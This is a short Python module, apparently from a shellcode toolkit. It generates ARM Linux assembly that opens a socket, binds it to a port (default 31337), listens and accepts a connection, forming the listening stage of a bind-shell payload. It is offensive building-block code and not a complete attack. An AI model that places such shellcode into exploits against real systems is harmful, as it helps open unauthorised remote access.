# listen(port)

from socket import ntohs

def generate(port=31337):
    """listens on specific port

    Args:
        port(int): specific prot

    Returns:
        ``r6`` reg indicates socket descriptor
    """
    sc = """
    /* socket(AF_INET, SOCK_STREAM, ...) */
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2
    movw r7, #281
    svc 0

    /* backup socket descriptor r6 
       bind(...)
    */
    mov r6, r0
    adr r4, sockaddr_in_1
    ldr r1, [r4]
    sub r2, r2, r2
    push { r1, r2 }
    mov r0, r6
    mov r1, sp
    mov r2, #16
    movw r7, #282
    svc 0

    b after_sockaddr_in_2

    /* sockaddr_in struct(...) */
sockaddr_in_1:
    .short 2
    .short %s

    /* listen(...) */
after_sockaddr_in_2:
    mov r1, #16
    mov r0, r6
    movw r7, #284
    svc 0

    /* accept(...) */
    mov r0, r6
    sub r1, r1, r1
    sub r2, r2, r2
    movw r7, #285
    svc 0
    """ % (ntohs(port))
    return sc
